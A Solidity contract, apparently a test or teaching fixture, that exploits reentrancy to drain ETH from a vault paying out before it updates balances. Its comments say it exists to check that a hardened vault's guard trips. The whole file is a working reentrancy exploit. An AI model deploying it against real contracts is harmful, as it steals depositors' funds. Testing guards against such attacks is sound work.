// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IVault} from "./IVault.sol";

/**
 * @title Attacker
 * @notice Drains ETH from a vault that violates Checks-Effects-Interactions.
 * @dev `attack()` seeds the vault with a single deposit, then calls withdraw.
 *      The vault pays out before zeroing the attacker's recorded balance, so
 *      `receive()` re-enters `withdraw()` and is paid again, repeatedly, until
 *      the vault is empty. `profit()` reports the net gain.
 *
 *      The re-entry condition is deliberately `address(vault).balance > 0`
 *      rather than a balance lookup: it keeps attacking while any ETH remains,
 *      which is what makes the hardened vault actually hit its guard. If the
 *      condition depended on `balanceOf`, the CEI fix alone would silently stop
 *      the recursion and the guard would never be exercised.
 */
contract Attacker {
    IVault public immutable vault;

    /// @notice ETH the attacker put in to get the exploit started.
    uint256 public seed;

    /// @notice Cumulative ETH received back from the vault.
    uint256 public drained;

    /**
     * @param target address of the vault to attack
     */
    constructor(address target) {
        vault = IVault(target);
    }

    /**
     * @notice Seed the vault and trigger the re-entrant withdrawal.
     * @dev Send ETH here as the initial deposit.
     */
    function attack() external payable {
        if (msg.value == 0) {
            revert MissingSeed();
        }
        seed = msg.value;
        vault.deposit{value: seed}();
        vault.withdraw();
    }

    /**
     * @notice Net ETH gained by the attack, or zero if it did not turn a profit.
     */
    function profit() external view returns (uint256) {
        return drained > seed ? drained - seed : 0;
    }

    /**
     * @dev The vault pays out here before it records the withdrawal, so this is
     *      where the re-entrant call is made.
     */
    receive() external payable {
        drained += msg.value;
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }

    error MissingSeed();
}
